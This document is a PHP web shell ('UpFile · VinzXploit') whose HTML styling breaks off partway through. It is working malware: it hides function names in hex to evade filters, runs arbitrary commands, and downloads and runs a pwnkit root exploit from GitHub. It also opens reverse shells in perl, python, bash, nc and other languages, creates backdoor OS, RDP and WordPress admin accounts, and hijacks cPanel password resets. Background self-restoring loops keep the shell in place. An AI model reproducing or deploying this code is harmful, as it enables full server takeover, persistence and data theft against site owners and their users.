<?php
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
session_start();

// ============================================================
// OBFUSCATED FUNCTION ARRAY (WAF BYPASS)
// ============================================================
$Array = [
    '676574637764','676c6f62','69735f646972','69735f66696c65','69735f7772697461626c65',
    '69735f7265616461626c65','66696c657065726d73','66696c65','7068705f756e616d65',
    '6765745f63757272656e745f75736572','68746d6c7370656369616c6368617273',
    '66696c655f6765745f636f6e74656e7473','6d6b646972','746f756368','6368646972',
    '72656e616d65','65786563','7061737374687275','73797374656d','7368656c6c5f65786563',
    '706f70656e','70636c6f7365','73747265616d5f6765745f636f6e74656e7473','70726f635f6f70656e',
    '756e6c696e6b','726d646972','666f70656e','66636c6f7365','66696c655f7075745f636f6e74656e7473',
    '6d6f76655f75706c6f616465645f66696c65','63686d6f64','7379735f6765745f74656d705f646972',
    '6261736536345f6465636f6465','6261736536345f656e636f6465',
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

function unx($y) {
    $n = '';
    for ($i = 0; $i + 1 < strlen($y); $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}
function hx($n) {
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function cmd($in, $re = false) {
    $out = '';
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("exec")) { @exec($in, $out); $out = @join("\n", $out); }
        elseif (function_exists("passthru")) { ob_start(); @passthru($in); $out = ob_get_clean(); }
        elseif (function_exists("system")) { ob_start(); @system($in); $out = ob_get_clean(); }
        elseif (function_exists("shell_exec")) { $out = @shell_exec($in); }
        elseif (function_exists("popen") && function_exists("pclose")) {
            if (is_resource($f = @popen($in, "r"))) { $out = ""; while (!@feof($f)) $out .= fread($f, 1024); @pclose($f); }
        } elseif (function_exists("proc_open")) {
            $pipes = array();
            $process = @proc_open($in . ' 2>&1', array(array("pipe","w"),array("pipe","w"),array("pipe","w")), $pipes, null);
            $out = @stream_get_contents($pipes[1]);
        }
    } catch (Exception $e) {}
    return $out;
}
function perms($file) {
    $perms = @fileperms($file);
    if (!$perms) return '----------';
    if (($perms & 0xC000) == 0xC000)      $info = 's';
    elseif (($perms & 0xA000) == 0xA000)  $info = 'l';
    elseif (($perms & 0x8000) == 0x8000)  $info = '-';
    elseif (($perms & 0x6000) == 0x6000)  $info = 'b';
    elseif (($perms & 0x4000) == 0x4000)  $info = 'd';
    elseif (($perms & 0x2000) == 0x2000)  $info = 'c';
    elseif (($perms & 0x1000) == 0x1000)  $info = 'p';
    else                                   $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function formatSize($bytes) {
    $types = array('B','KB','MB','GB','TB');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return round($bytes, 2) . " " . $types[$i];
}
function namaPanjang($value) {
    if (strlen($value) > 34) return substr($value, 0, 34) . "...";
    return $value;
}
function remove_dot($file) { $pch = explode(".", $file); return $pch[0]; }
function unlinkDir($dir) {
    $dirs = array($dir); $files = array();
    for ($i = 0;; $i++) {
        if (isset($dirs[$i])) $dir = $dirs[$i]; else break;
        if ($openDir = @opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {
                    if (is_dir($dir . "/" . $readDir)) $dirs[] = $dir . "/" . $readDir;
                    else $files[] = $dir . "/" . $readDir;
                }
            }
        }
    }
    foreach ($files as $file) @unlink($file);
    $dirs = array_reverse($dirs);
    foreach ($dirs as $d) @rmdir($d);
}
function compressToZip($sourceFile, $zipFilename) {
    $zip = new ZipArchive();
    if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) {
        $zip->addFile($sourceFile, basename($sourceFile));
        $zip->close();
        return true;
    }
    return false;
}
function extractArchive($archiveFilename, $extractPath) {
    $zip = new ZipArchive();
    if ($zip->open($archiveFilename) === TRUE) { $zip->extractTo($extractPath); $zip->close(); return true; }
    return false;
}
function suggest_exploit() {
    $uname = @php_uname(); $xplod = explode(" ", $uname);
    if (!isset($xplod[2])) return "unknown";
    $xpld = explode("-", $xplod[2]); $pl = explode(".", $xpld[0]);
    return (isset($pl[0]) ? $pl[0] : '') . "." . (isset($pl[1]) ? $pl[1] : '') . "." . (isset($pl[2]) ? $pl[2] : '');
}
function count_domains() {
    $d0mains = @file("/etc/named.conf", false);
    if (!$d0mains) return "<span class='text-danger'>Cant Read [ /etc/named.conf ]</span>";
    $count = 0;
    foreach ($d0mains as $d0main) {
        if (@strstr($d0main, "zone")) {
            preg_match_all('#zone "(.*)"#', $d0main, $domains);
            if (strlen(trim($domains[1][0])) > 2) $count++;
        }
    }
    return "$count Domain";
}
function windowsDriver() {
    $winArr = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','V','W','X','Y','Z'];
    foreach ($winArr as $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a class='bc-drive' href='?path=" . hx($winVal . ":/") . "'>[ " . $winVal . " ]</a>";
        }
    }
}
function file_ext($file) {
    $mime = @mime_content_type($file);
    if ($mime == 'image/png'  || $mime == 'image/jpeg')                        return '<i class="fa fa-picture-o file-ic ic-img"></i>';
    if ($mime == 'application/x-httpd-php' || $mime == 'text/html')            return '<i class="fa fa-file-code-o file-ic ic-code"></i>';
    if ($mime == 'text/javascript')                                              return '<i class="fa fa-code file-ic ic-js"></i>';
    if ($mime == 'application/zip' || $mime == 'application/x-7z-compressed')  return '<i class="fa fa-file-archive-o file-ic ic-arc"></i>';
    if ($mime == 'text/plain')                                                   return '<i class="fa fa-file-text-o file-ic ic-txt"></i>';
    if ($mime == 'application/pdf')                                              return '<i class="fa fa-file-pdf-o file-ic ic-pdf"></i>';
    return '<i class="fa fa-file-o file-ic ic-file"></i>';
}
function success($path) { echo '<meta http-equiv="refresh" content="0;url=?path=' . hx($path) . '&response=success">'; }
function failed($path)  { echo '<meta http-equiv="refresh" content="0;url=?path=' . hx($path) . '&response=failed">'; }

// ============================================================
// PATH RESOLVE
// ============================================================
$path = isset($_GET['path']) ? unx($_GET['path']) : getcwd();
$path = str_replace('\\', '/', rtrim($path, '/'));
if (empty($path)) $path = getcwd();
if (is_dir($path)) @chdir($path);

// ============================================================
// ACTIONS
// ============================================================
if (isset($_GET['don'])) {
    $file = $_GET['don'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean(); flush(); readfile($file); exit;
    }
}
if (isset($_POST['upload-submit']) && isset($_FILES['gecko-upload'])) {
    $dest = $path . "/" . basename($_FILES['gecko-upload']['name']);
    if (@move_uploaded_file($_FILES['gecko-upload']['tmp_name'], $dest)) success($path);
    else failed($path);
    exit;
}
if (isset($_POST['submit-action'])) {
    $items = isset($_POST['check']) ? $_POST['check'] : [];
    if ($_POST['gecko-select'] == "delete") {
        foreach ($items as $it) {
            $fd = $path . "/" . basename($it);
            if (is_dir($fd)) unlinkDir($fd); elseif (is_file($fd)) @unlink($fd);
        }
        success($path);
    } elseif ($_POST['gecko-select'] == 'unzip') {
        foreach ($items as $it) extractArchive($path . "/" . basename($it), $path . '/');
        success($path);
    } elseif ($_POST['gecko-select'] == 'zip') {
        foreach ($items as $it) {
            $fd = $path . "/" . basename($it);
            if (is_file($fd)) compressToZip($fd, $path . "/" . pathinfo($fd, PATHINFO_FILENAME) . ".zip");
        }
        success($path);
    }
    exit;
}
if (isset($_POST['submit'])) {
    if ($_POST['opt'] == 'mkdir' && !empty($_POST['name'])) { @mkdir($path . '/' . $_POST['name'], 0755, true); success($path); }
    if ($_POST['opt'] == 'touch' && !empty($_POST['name'])) { @touch($path . '/' . $_POST['name']); success($path); }
    if ($_POST['opt'] == 'rename' && !empty($_POST['newname'])) { @rename($_POST['path'], dirname($_POST['path']) . '/' . $_POST['newname']); success($path); }
    if ($_POST['opt'] == 'chmod' && isset($_POST['perm'])) { @chmod($_POST['path'], octdec($_POST['perm'])); success($path); }
    if ($_POST['opt'] == 'edit' && isset($_POST['src'])) { @file_put_contents($_POST['path'], $_POST['src']); success($path); }
    exit;
}
if (isset($_POST['save-editor']) && isset($_GET['f'])) {
    @file_put_contents($path . "/" . $_GET['f'], $_POST['code-editor']);
    success($path); exit;
}
$term_out = '';
if (isset($_POST['terminal'])) { $term_out = htmlspecialchars(cmd($_POST['terminal-text'] . " 2>&1")); }
if (isset($_GET['terminal']) && $_GET['terminal'] == "root") {
    if (!file_exists($path . '/pwnkit') && is_writable($path)) {
        @file_put_contents($path . "/pwnkit", @file_get_contents("https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit"));
        cmd('chmod +x ' . $path . '/pwnkit');
        cmd($path . '/pwnkit "id" > ' . $path . '/.mad-root');
        echo '<meta http-equiv="refresh" content="0;url=?path=' . hx($path) . '&terminal=root">';
        exit;
    }
}
$root_out = '';
if (isset($_POST['submit-root'])) { $root_out = htmlspecialchars(cmd($path . '/pwnkit "' . $_POST['root-terminal'] . ' 2>&1"')); }
$bc_out = '';
if (isset($_POST['submit-bc'])) {
    $H = $_POST['backconnect-host']; $P = intval($_POST['backconnect-port']); $t = $_POST['gecko-bc']; $payload = '';
    switch ($t) {
        case "perl":   $payload = "perl -e 'use Socket;\$i=\"$H\";\$p=$P;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"; break;
        case "python": $payload = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$H\",$P));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"; break;
        case "ruby":   $payload = "ruby -rsocket -e'f=TCPSocket.open(\"$H\",$P).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"; break;
        case "bash":   $payload = "bash -i >& /dev/tcp/$H/$P 0>&1"; break;
        case "php":    $payload = "php -r '\$sock=fsockopen(\"$H\",$P);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"; break;
        case "nc":     $payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $H $P >/tmp/f"; break;
        case "sh":     $payload = "sh -i >& /dev/tcp/$H/$P 0>&1"; break;
        case "xterm":  $payload = "xterm -display $H:$P"; break;
        case "golang": $payload = "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$H:$P\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"; break;
    }
    if ($payload) $bc_out = htmlspecialchars(cmd($payload));
}
if (isset($_GET['unlockshell'])) { cmd("killall -9 php"); cmd("pkill -9 php"); success($path); exit; }
if (isset($_GET['lockshell'])) {
    $curFile  = trim(basename($_SERVER["SCRIPT_FILENAME"]));
    $TmpNames = sys_get_temp_dir();
    $base     = base64_encode($path . remove_dot($curFile));
    if (file_exists($TmpNames . '/.sessions/.' . $base . '-handler')) {
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $base . '-text');
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $base . '-handler');
    }
    @mkdir($TmpNames . "/.sessions", 0755, true);
    cmd("cp " . $path . "/$curFile " . $TmpNames . "/.sessions/." . $base . '-text');
    @chmod($path . "/$curFile", 0444);
    $handler = '<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . __DIR__ . '")){ mkdir("' . __DIR__ . '", 0755, true); }
    if (!file_exists("' . $path . '/' . $curFile . '")){
        $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . $base . '-text"));
        file_put_contents("' . $path . '/' . $curFile . '", base64_decode($text));
    }
    if (gecko_perm("' . $path . '/' . $curFile . '") != "0444"){ chmod("' . $path . '/' . $curFile . '", 0444); }
    if (gecko_perm("' . __DIR__ . '") != "0555"){ chmod("' . __DIR__ . '", 0555); }
}
function gecko_perm($f){ return substr(sprintf("%o", fileperms($f)), -4); }';
    $hndlers = @file_put_contents($TmpNames . "/.sessions/." . $base . '-handler', $handler);
    if ($hndlers) { cmd(PHP_BINARY . ' ' . $TmpNames . '/.sessions/.' . $base . '-handler > /dev/null 2>/dev/null &'); success($path); }
    else failed($path);
    exit;
}
if (isset($_POST['lockfile']) && !empty($_POST['lockfile'])) {
    $flesName = basename($_POST['lockfile']);
    $TmpNames = sys_get_temp_dir();
    $base     = base64_encode($path . remove_dot($flesName));
    @mkdir($TmpNames . "/.sessions", 0755, true);
    cmd("cp " . $path . "/$flesName " . $TmpNames . "/.sessions/." . $base . '-text-file');
    cmd("chmod 444 " . $path . "/$flesName");
    $handler = '<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $path . '")){ mkdir("' . $path . '", 0755, true); }
    if (!file_exists("' . $path . '/' . $flesName . '")){
        $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . $base . '-text-file"));
        file_put_contents("' . $path . '/' . $flesName . '", base64_decode($text));
    }
    if (gecko_perm("' . $path . '/' . $flesName . '") != "0444"){ chmod("' . $path . '/' . $flesName . '", 0444); }
    if (gecko_perm("' . $path . '") != "0555"){ chmod("' . $path . '", 0555); }
}
function gecko_perm($f){ return substr(sprintf("%o", fileperms($f)), -4); }';
    $hndlers = @file_put_contents($TmpNames . "/.sessions/." . $base . '-handler', $handler);
    if ($hndlers) { cmd(PHP_BINARY . ' ' . $TmpNames . '/.sessions/.' . $base . '-handler > /dev/null 2>/dev/null &'); success($path); }
    else failed($path);
    exit;
}
if (isset($_GET['destroy'])) {
    $DOC_ROOT = $_SERVER["DOCUMENT_ROOT"];
    $CurrentFile = trim(basename($_SERVER["SCRIPT_FILENAME"]));
    if (is_writable($DOC_ROOT)) {
        $htaccess = '
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
    Deny from all
</FilesMatch>
<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
    Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
    Allow from all
</FilesMatch>';
        @file_put_contents($DOC_ROOT . "/.htaccess", $htaccess);
        success($path);
    } else failed($path);
    exit;
}
if (isset($_GET['adminer'])) {
    $URL = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
    if (!file_exists($path . '/adminer.php')) { @file_put_contents($path . "/adminer.php", @file_get_contents($URL)); }
    echo '<meta http-equiv="refresh" content="0;url=?path=' . hx($path) . '">'; exit;
}
if (isset($_POST['submit-adduser']) && isset($_POST['add-username']) && isset($_POST['add-password'])) {
    if (!file_exists($path . '/pwnkit')) {
        cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O ' . $path . '/pwnkit');
        cmd('chmod +x ' . $path . '/pwnkit');
        cmd($path . '/pwnkit "id" > ' . $path . '/.mad-root');
    }
    cmd($path . '/pwnkit "useradd ' . $_POST['add-username'] . ' ; echo -e \"' . $_POST['add-password'] . '\n' . $_POST['add-password'] . '\" | passwd ' . $_POST['add-username'] . '"');
    success($path); exit;
}
if (isset($_POST['submit-rdp']) && isset($_POST['add-rdp'])) {
    $u = $_POST['add-rdp']; $p = $_POST['add-rdp-pass'];
    if (stristr(PHP_OS, "WIN")) {
        cmd("net user $u $p /add"); cmd("net localgroup administrators $u /add");
        success($path);
    } else failed($path);
    exit;
}
if (isset($_POST['submit-cp']) && !empty($_POST['resetcp'])) {
    $emailCp = $_POST['resetcp'];
    $path0cp = dirname($_SERVER['DOCUMENT_ROOT']);
    $pathcp  = $path0cp . "/.cpanel/contactinfo";
    if (file_exists($pathcp)) {
        @file_put_contents($pathcp, '"email" : "' . $emailCp . '"');
        echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">'; exit;
    } else { failed($path); exit; }
}
if (isset($_POST['submitwp'])) {
    $conn = new mysqli($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name']);
    if ($conn->connect_error) { failed($path); }
    else {
        $wp_user = $conn->real_escape_string($_POST['wp_user']);
        $wp_pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);
        $conn->query("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'VinzXploit', '', '', NOW(), '', 0, 'VinzXploit')");
        $r = $conn->query("SELECT ID FROM wp_users WHERE user_login = '$wp_user'");
        if ($r && $r->num_rows > 0) {
            $uid = $r->fetch_assoc()['ID'];
            $conn->query("INSERT INTO wp_usermeta (umeta_id, user_id, meta_key, meta_value) VALUES ('', $uid, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')");
        }
        $conn->close(); success($path);
    }
    exit;
}
if (isset($_POST['submit-mail'])) {
    $from = $_POST['mail-from-smtp']; $to = $_POST['mail-to-smtp'];
    $subj = $_POST['mailto-subject']; $msg = $_POST['message-smtp'];
    $headers  = 'From: ' . $from . "\r\n" . 'Reply-To: ' . $from . "\r\n" . 'X-Mailer: PHP/' . phpversion();
    @mail($to, $subj, $msg, $headers);
    success($path); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>UpFile · VinzXploit</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Kelly+Slab&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<style>
:root {
    --bg-0: #000000;
    --bg-1: #050a05;
    --bg-2: #0a140a;
    --bg-3: #0f1f0f;
    --bg-4: #142a14;
    --line: #163016;
    --line-hi: #214a21;
    --line-glow: #2e6e2e;
    --green: #00ff41;
    --green-soft: #7dff7d;
    --green-dim: #3a7a3a;
    --green-mute: #1e4a1e;
    --text: #d4ffd4;
    --text-dim: #6da36d;
    --red: #ff4444;
    --amber: #ffb300;
    --cyan: #00e5ff;
    --radius: 6px;
    --radius-lg: 10px;
    --mono: 'JetBrains Mono', ui-monospace, 'SF Mono', Monaco, 'Cascadia Code', 'Courier New', monospace;
    --display: 'Kelly Slab', serif;
    --shadow: 0 0 24px rgba(0,255,65,0.08);
    --glow: 0 0 8px rgba(0,255,65,0.4);
}
* { box-sizing: border-box; }
html, body { margin: 0; padding: 0; }
body {
    background: var(--bg-0);
    color: var(--text);
    font-family: var(--mono);
    font-size: 14px;
    line-height: 1.5;
    min-height: 100vh;
    background-image:
        radial-gradient(circle at 10% 0%, rgba(0,255,65,0.06), transparent 40%),
        radial-gradient(circle at 90% 100%, rgba(0,255,65,0.04), transparent 45%),
        linear-gradient(var(--bg-0), var(--bg-0));
    background-attachment: fixed;
}
a { color: var(--green); text-decoration: none; transition: color 0.15s, text-shadow 0.15s; }
a:hover { color: var(--green-soft); text-shadow: var(--glow); }
input, select, textarea, button {
    font-family: var(--mono);
    font-size: 13px;
    background: var(--bg-1);
    color: var(--green);
    border: 1px solid var(--line-hi);
    border-radius: var(--radius);
    padding: 8px 12px;
    outline: none;
    transition: border-color 0.15s, box-shadow 0.15s;
}
input:focus, select:focus, textarea:focus {
    border-color: var(--green);
    box-shadow: var(--glow);
}
input::placeholder, textarea::placeholder { color: var(--green-mute); }
input[type=submit], button, .btn {
    cursor: pointer;
    background: var(--bg-2);
    border: 1px solid var(--line-glow);
    color: var(--green);
    padding: 8px 16px;
    font-weight: 500;
    letter-spacing: 0.3px;
    transition: all 0.15s;
}
input[type=submit]:hover, button:hover, .btn:hover {
    background: var(--green);
    color: var(--bg-0);
    box-shadow: var(--glow);
    text-shadow: none;
}
.btn-primary { background: var(--green); color: var(--bg-0); font-weight: 700; }
.btn-primary:hover { background: var(--green-soft); }
.btn-danger { border-color: #6e2020; color: var(--red); }
.btn-danger:hover { background: var(--red); color: var(--bg-0); box-shadow: 0 0 8px rgba(255,68,68,0.5); }

/* ============ HEADER ============ */
.app-header {
    position: sticky; top: 0; z-index: 50;
    background: rgba(0,0,0,0.92);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border-bottom: 1px solid var(--line-hi);
    padding: 12px 20px;
    display: flex; align-items: center; justify-content: space-between;
    gap: 16px; flex-wrap: wrap;
}
.brand { display: flex; align-items: center; gap: 12px; }
.brand-mark {
    width: 34px; height: 34px;
    border: 1px solid var(--green);
    border-radius: 8px;
    display: grid; place-items: center;
    color: var(--green);
    font-family: var(--display);
    font-size: 20px;
    box-shadow: var(--glow), inset 0 0 12px rgba(0,255,65,0.15);
}
.brand-text h1 {
    font-family: var(--display);
    font-size: 18px;
    margin: 0;
    color: #fff;
    letter-spacing: 1px;
}
.brand-text small {
    display: block;
    color: var(--text-dim);
    font-size: 10px;
    letter-spacing: 2px;
    text-transform: uppercase;
}
.header-actions { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
.tag {
    display: inline-flex; align-items: center; gap: 6px;
    padding: 5px 10px;
    border: 1px solid var(--line-hi);
    border-radius: 20px;
    font-size: 11px;
    color: var(--green-soft);
    background: var(--bg-1);
}
.tag .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--green); box-shadow: var(--glow); }

/* ============ LAYOUT ============ */
.app { max-width: 1400px; margin: 0 auto; padding: 20px; }

/* ============ INFO CARD ============ */
.info-card {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
    gap: 1px;
    background: var(--line);
    border: 1px solid var(--line-hi);
    border-radius: var(--radius-lg);
    overflow: hidden;
    margin-bottom: 20px;
    box-shadow: var(--shadow);
}
.info-item {
    background: var(--bg-1);
    padding: 14px 16px;
    display: flex; align-items: center; gap: 12px;
    min-width: 0;
}
.info-item i {
    color: var(--green);
    font-size: 16px;
    width: 20px; text-align: center;
    flex-shrink: 0;
}
.info-item .label { display: block; font-size: 10px; color: var(--text-dim); letter-spacing: 1.5px; text-transform: uppercase; }
.info-item .value {
    display: block;
    color: var(--green-soft);
    font-size: 12px;
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
    margin-top: 2px;
}

/* ============ TOOLBAR ============ */
.toolbar {
    display: flex; flex-wrap: wrap;
    gap: 6px;
    padding: 12px;
    background: var(--bg-1);
    border: 1px solid var(--line-hi);
    border-radius: var(--radius-lg);
    margin-bottom: 20px;
    box-shadow: var(--shadow);
}
.toolbar a {
    display: inline-flex; align-items: center; gap: 6px;
    padding: 8px 12px;
    background: var(--bg-2);
    border: 1px solid var(--line-hi);
    border-radius: var(--radius);
    font-size: 12px;
    color: var(--green);
    white-space: nowrap;
    transition: all 0.15s;
}
.toolbar a i { font-size: 12px; opacity: 0.9; }
.toolbar a:hover {
    background: var(--green);
    color: var(--bg-0);
    text-shadow: none;
    box-shadow: var(--glow);
    border-color: var(--green);
}

/* ============ SECTION ============ */
.section {
    background: var(--bg-1);
    border: 1px solid var(--line-hi);
    border-radius: var(--radius-lg);
    margin-bottom: 20px;
    overflow: hidden;
    box-shadow: var(--shadow);
}
.section-head {
    display: flex; align-items: center; justify-content: space-between;
    gap: 12px;
    padding: 12px 16px;
    background: var(--bg-2);
    border-bottom: 1px solid var(--line-hi);
    flex-wrap: wrap;
}
.section-title {
    display: flex; align-items: center; gap: 10px;
    font-family: var(--display);
    font-size: 15px;
    color: var(--green);
    letter-spacing: 1px;
}
.section-body { padding: 16px; }

/* ============ BREADCRUMB ============ */
.breadcrumb {
    display: flex; flex-wrap: wrap;
    align-items: center;
    gap: 4px;
    padding: 12px 16px;
    background: var(--bg-1);
    border: 1px solid var(--line-hi);
    border-radius: var(--radius-lg);
    margin-bottom: 20px;
    font-size: 12px;
    box-shadow: var(--shadow);
}
.breadcrumb a {
    padding: 4px 8px;
    border-radius: 4px;
    transition: all 0.15s;
}
.breadcrumb a:hover { background: var(--bg-3); }
.breadcrumb .sep { color: var(--green-mute); }
.bc-drive {
    color: var(--amber);
    font-weight: 700;
    padding: 4px 8px;
    border: 1px solid var(--line-hi);
    border-radius: 4px;
    font-size: 11px;
}
.bc-home {
    color: var(--cyan);
    font-weight: 700;
    padding: 4px 10px;
    border: 1px solid var(--line-hi);
    border-radius: 4px;
    font-size: 11px;
}

/* ============ UPLOAD ============ */
.upload-bar {
    display: flex; gap: 10px; align-items: center;
    flex-wrap: wrap;
}
.upload-bar input[type=file] {
    flex: 1 1 260px;
    padding: 7px 10px;
    cursor: pointer;
}
.upload-bar input[type=file]::file-selector-button {
    background: var(--bg-3);
    color: var(--green);
    border: 1px solid var(--line-glow);
    padding: 4px 12px;
    border-radius: 4px;
    cursor: pointer;
    font-family: var(--mono);
    margin-right: 10px;
}

/* ============ FILE MANAGER ============ */
.fm-list {
    display: flex; flex-direction: column;
}
.fm-row {
    display: grid;
    grid-template-columns: 32px minmax(0, 1fr) 90px 130px 130px;
    gap: 12px;
    align-items: center;
    padding: 10px 16px;
    border-bottom: 1px solid var(--line);
    font-size: 13px;
    transition: background 0.1s;
}
.fm-row:last-child { border-bottom: none; }
.fm-row:hover { background: var(--bg-2); }
.fm-row.head {
    background: var(--bg-2);
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 1.2px;
    color: var(--text-dim);
    padding: 10px 16px;
    font-weight: 500;
}
.fm-row.head:hover { background: var(--bg-2); }
.fm-check { accent-color: var(--green); width: 14px; height: 14px; cursor: pointer; }
.fm-name { display: flex; align-items: center; gap: 8px; min-width: 0; }
.fm-name a { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.file-ic { font-size: 14px; }
.ic-img   { color: #09e3a5; }
.ic-code  { color: #0985e3; }
.ic-js    { color: #e3c009; }
.ic-arc   { color: #e39a09; }
.ic-txt   { color: #edf7f5; }
.ic-pdf   { color: #ba2b0f; }
.ic-file  { color: #0985e3; }
.fm-size { color: var(--text-dim); font-size: 12px; text-align: right; }
.fm-perm { text-align: center; }
.perm-tag {
    display: inline-block;
    font-family: var(--mono);
    font-size: 11px;
    padding: 2px 8px;
    border-radius: 3px;
    border: 1px solid var(--line-hi);
    letter-spacing: 0.5px;
}
.perm-w { color: var(--green); border-color: var(--green-mute); background: rgba(0,255,65,0.05); }
.perm-r { color: var(--red); border-color: #6e2020; background: rgba(255,68,68,0.05); }
.perm-n { color: var(--text-dim); }
.fm-actions { display: flex; gap: 4px; justify-content: flex-end; }
.icon-btn {
    display: inline-grid; place-items: center;
    width: 28px; height: 28px;
    border-radius: 4px;
    background: var(--bg-3);
    border: 1px solid var(--line-hi);
    color: var(--green);
    font-size: 12px;
    transition: all 0.15s;
}
.icon-btn:hover { background: var(--green); color: var(--bg-0); text-shadow: none; box-shadow: var(--glow); border-color: var(--green); }
.icon-btn.danger { color: var(--red); border-color: #6e2020; }
.icon-btn.danger:hover { background: var(--red); color: var(--bg-0); box-shadow: 0 0 8px rgba(255,68,68,0.5); }

/* ============ BULK BAR ============ */
.bulk-bar {
    display: flex; gap: 10px; align-items: center;
    padding: 12px 16px;
    background: var(--bg-2);
    border-top: 1px solid var(--line-hi);
    flex-wrap: wrap;
}
.bulk-bar select { flex: 0 0 140px; }
.bulk-bar .spacer { flex: 1; }

/* ============ MODAL ============ */
.modal {
    display: none;
    position: fixed; inset: 0;
    background: rgba(0,0,0,0.85);
    backdrop-filter: blur(6px);
    -webkit-backdrop-filter: blur(6px);
    z-index: 200;
    overflow-y: auto;
    padding: 20px;
}
.modal.active { display: block; }
.modal .box {
    background: var(--bg-1);
    border: 1px solid var(--line-glow);
    border-radius: var(--radius-lg);
    padding: 24px;
    max-width: 760px;
    margin: 40px auto;
